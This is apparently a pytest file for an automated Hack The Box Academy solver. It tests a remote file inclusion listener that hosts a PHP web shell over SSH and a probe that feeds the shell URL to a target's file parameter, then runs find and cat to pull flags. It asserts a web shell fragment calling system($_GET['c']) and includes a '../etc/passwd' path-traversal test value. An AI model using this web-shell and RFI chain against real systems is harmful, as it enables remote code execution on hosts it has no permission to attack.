"""Unit tests for the RFI listener + RFI probe.

The listener does real-world things on a remote Kali (mktemp, drop
files, start http.server, kill it on exit). All of those are SSH
commands, so we mock the SshTargetRunner. The probe orchestrator
gets the same _Recorder that test_lfi_runner uses to canned-respond
to HTTP requests.
"""

from __future__ import annotations

from dataclasses import dataclass, field

import pytest

from htbrl.academy.rfi_runner import (
    DEFAULT_SHELL_PHP,
    RfiAttempt,
    RfiListener,
    RfiListenerInfo,
    probe_via_rfi,
    try_rfi_rce,
)
from htbrl.academy.ssh_runner import SshResult
from htbrl.academy.target_runner import HttpResponse


# ---- mock SSH runner -------------------------------------------------------


@dataclass
class _ScriptedSsh:
    """SshTargetRunner stand-in that returns canned responses by command prefix.

    Each entry in ``scripts`` maps a regex-style prefix to ``(stdout, rc)``.
    The first matching prefix wins. ``calls`` records every issued
    command so tests can assert ordering.
    """

    scripts: list[tuple[str, tuple[str, int]]] = field(default_factory=list)
    calls: list[str] = field(default_factory=list)

    def run(self, cmd: str, *, timeout_s=None) -> SshResult:
        self.calls.append(cmd)
        for prefix, (stdout, rc) in self.scripts:
            if cmd.startswith(prefix) or prefix in cmd:
                return SshResult(cmd=cmd, rc=rc, stdout=stdout)
        return SshResult(cmd=cmd, rc=0, stdout="")


# ---- listener: happy path --------------------------------------------------


def test_listener_open_and_close_lifecycle():
    """``open`` runs mktemp, drops payload, free-port probe, nohup,
    readiness probe; ``close`` kills + rm -rf."""

    ssh = _ScriptedSsh(scripts=[
        ("mktemp -d", ("/tmp/htbrl-rfi-deadbeef-XXXX/abc\n", 0)),
        ("cat > ", ("", 0)),                    # heredoc payload write
        ("python3 -c 'import socket;s=socket.socket();s.bind", ("31337\n", 0)),
        ("cd /tmp/htbrl-rfi", ("4242\n", 0)),    # nohup ... echo $!
        ("python3 -c 'import socket;s=socket.socket();s.settimeout", ("", 0)),
        ("kill 4242", ("", 0)),
    ])
    listener = RfiListener(ssh, listen_ip="10.10.15.54")
    info = listener.open()

    assert isinstance(info, RfiListenerInfo)
    assert info.base_url == "http://10.10.15.54:31337"
    assert info.tempdir == "/tmp/htbrl-rfi-deadbeef-XXXX/abc"
    assert info.pid == 4242
    assert info.payload_filenames == ["shell.php"]

    # Calls in order: mktemp, cat>shell.php, port probe, nohup, ready probe.
    assert ssh.calls[0].startswith("mktemp -d")
    assert "cat > /tmp/htbrl-rfi-deadbeef-XXXX/abc/shell.php" in ssh.calls[1]
    assert "import socket" in ssh.calls[2]
    assert "nohup python3 -m http.server 31337" in ssh.calls[3]
    assert "settimeout" in ssh.calls[4]

    listener.close()
    # Final kill + rm.
    assert any("kill 4242" in c and "rm -rf" in c for c in ssh.calls)
    # Idempotent close: second call doesn't issue a second kill.
    n_before = len(ssh.calls)
    listener.close()
    assert ssh.calls[n_before:] == []


def test_listener_url_for_returns_full_url_after_open():
    ssh = _ScriptedSsh(scripts=[
        ("mktemp -d", ("/tmp/htbrl-rfi-x/y\n", 0)),
        ("cat > ", ("", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.bind", ("9000\n", 0)),
        ("cd /tmp", ("123\n", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.settimeout", ("", 0)),
    ])
    with RfiListener(ssh, listen_ip="1.2.3.4") as l:
        assert l.url_for("shell.php") == "http://1.2.3.4:9000/shell.php"


def test_listener_url_for_rejects_unknown_filename():
    ssh = _ScriptedSsh(scripts=[
        ("mktemp -d", ("/tmp/htbrl-rfi-x/y\n", 0)),
        ("cat > ", ("", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.bind", ("9000\n", 0)),
        ("cd /tmp", ("123\n", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.settimeout", ("", 0)),
    ])
    with RfiListener(ssh, listen_ip="1.2.3.4") as l:
        with pytest.raises(KeyError):
            l.url_for("nonexistent.php")


def test_listener_pinned_port_skips_free_port_probe():
    """When listen_port != 0 we skip the python3 socket free-port probe."""
    ssh = _ScriptedSsh(scripts=[
        ("mktemp -d", ("/tmp/htbrl-rfi-x/y\n", 0)),
        ("cat > ", ("", 0)),
        ("cd /tmp", ("999\n", 0)),
        # Readiness probe uses python3 socket settimeout; matching exact prefix.
        ("python3 -c 'import socket;s=socket.socket();s.settimeout", ("", 0)),
    ])
    listener = RfiListener(ssh, listen_ip="1.2.3.4", listen_port=4444)
    info = listener.open()
    assert info.base_url == "http://1.2.3.4:4444"
    listener.close()
    # Verify no free-port probe was issued (only readiness probe used the
    # ``settimeout`` form; the bind-zero form is absent).
    assert not any("s.bind((\"0.0.0.0\",0))" in c for c in ssh.calls)


# ---- listener: failure paths -----------------------------------------------


def test_listener_raises_when_mktemp_fails():
    ssh = _ScriptedSsh()
    # Default _ScriptedSsh returns ok=True with empty stdout. Force
    # mktemp to fail by overriding run() temporarily.
    real_run = ssh.run
    def _fail_first(cmd, *, timeout_s=None):
        ssh.calls.append(cmd)
        return SshResult(cmd=cmd, rc=1, stderr="mktemp: permission denied")
    ssh.run = _fail_first  # type: ignore
    listener = RfiListener(ssh, listen_ip="1.2.3.4")
    with pytest.raises(RuntimeError, match="mktemp failed"):
        listener.open()


def test_listener_rejects_payload_filename_with_slash():
    ssh = _ScriptedSsh(scripts=[
        ("mktemp -d", ("/tmp/htbrl-rfi-x/y\n", 0)),
    ])
    listener = RfiListener(
        ssh, listen_ip="1.2.3.4",
        payloads={"../etc/passwd": "evil"},
    )
    with pytest.raises(ValueError, match="must be a basename"):
        listener.open()


def test_listener_close_idempotent_when_never_opened():
    """``close`` on a never-opened listener is a no-op (no SSH calls)."""
    ssh = _ScriptedSsh()
    listener = RfiListener(ssh, listen_ip="1.2.3.4")
    listener.close()
    assert ssh.calls == []


def test_listener_default_payload_is_php_shell():
    """Sanity: the canned shell uses ``$_GET[c]`` (unquoted, log-safe)."""
    assert "system($_GET['c'])" in DEFAULT_SHELL_PHP
    assert DEFAULT_SHELL_PHP.startswith("<?php")


# ---- probe_via_rfi: dispatcher ---------------------------------------------


@dataclass
class _HttpRecorder:
    """HttpTargetRunner stand-in. Returns canned bodies based on the
    ``c=`` cmd in the query string so we can simulate different
    shell command outputs."""
    bodies_by_cmd: dict[str, str] = field(default_factory=dict)
    default_body: str = "<h2>Containers</h2>(blank)<p class=\"read-more\">"
    calls: list[str] = field(default_factory=list)
    host: str = "1.2.3.4"
    port: int = 80
    scheme: str = "http"

    def request(self, path: str, *, method: str = "GET", **_):
        self.calls.append(path)
        body = self.default_body
        for cmd_substr, body_template in self.bodies_by_cmd.items():
            if cmd_substr in path:
                body = body_template
                break
        return HttpResponse(status=200, body_text=body, url=path)


def _wrap(inner: str) -> str:
    return (
        f'<html><body><h2>Containers</h2>{inner}'
        f'<p class="read-more"></body></html>'
    )


def _opened_listener(scripts=None) -> RfiListener:
    """Build a listener that's already open() against a scripted SSH."""
    ssh = _ScriptedSsh(scripts=scripts or [
        ("mktemp -d", ("/tmp/htbrl-rfi-x/y\n", 0)),
        ("cat > ", ("", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.bind", ("8080\n", 0)),
        ("cd /tmp", ("100\n", 0)),
        ("python3 -c 'import socket;s=socket.socket();s.settimeout", ("", 0)),
    ])
    listener = RfiListener(ssh, listen_ip="10.10.15.54")
    listener.open()
    return listener


def test_probe_via_rfi_recognises_rfi_prompt_and_returns_flag():
    flag = "HTB{rfi_l!st3n3r_w0rks}"
    listener = _opened_listener()
    runner = _HttpRecorder(
        bodies_by_cmd={
            "find+/+-name": _wrap(
                f"/exercise/flag.txt\n{flag}\n"
            ),
        },
    )
    result = probe_via_rfi(
        runner, listener,
        "Attack the target, gain command execution by exploiting the RFI "
        "vulnerability, and read the flag at /.",
    )
    assert result is not None
    answer, rationale, conf = result
    assert answer == flag
    assert conf == pytest.approx(0.92)
    assert "RFI listener" in rationale


def test_probe_via_rfi_returns_none_for_non_rfi_prompts():
    """Non-RFI prompts must not trigger any HTTP calls (we bail early)."""
    listener = _opened_listener()
    runner = _HttpRecorder()
    result = probe_via_rfi(
        runner, listener,
        "What is the HTTP method used in this request?",
    )
    assert result is None
    assert runner.calls == []


def test_probe_via_rfi_uses_param_hint_from_code_blocks():
    """When the section's example URL uses ``?file=`` we use ``file``."""
    flag = "HTB{file_param_rfi}"
    listener = _opened_listener()
    # Probe encodes the value with safe=":/?=&" so colons/slashes
    # survive literal in the query string.
    runner = _HttpRecorder(
        bodies_by_cmd={
            "file=http://10.10.15.54:8080/shell.php": _wrap(flag),
        },
    )
    result = probe_via_rfi(
        runner, listener,
        "Use RFI to read /flag.txt by hosting a malicious file from our listener.",
        section_code_blocks=["GET /index.php?file=lang/en.php"],
    )
    assert result is not None
    assert result[0] == flag


def test_probe_via_rfi_chains_find_then_cat_for_unnamed_flag_paths():
    """If find returns a path but no flag in that response, we
    follow up with ``cat <path>`` and return the flag from there."""
    flag = "HTB{cat_chain_w0rk5}"
    listener = _opened_listener()
    runner = _HttpRecorder(
        bodies_by_cmd={
            "find+/+-name": _wrap("/exercise/flag.txt\n"),  # find result
            "cat+/exercise/flag.txt": _wrap(flag),
        },
    )
    result = probe_via_rfi(
        runner, listener,
        "Exploit RFI and read the flag",
    )
    assert result is not None
    assert result[0] == flag
    assert "cat /exercise/flag.txt" in result[1]
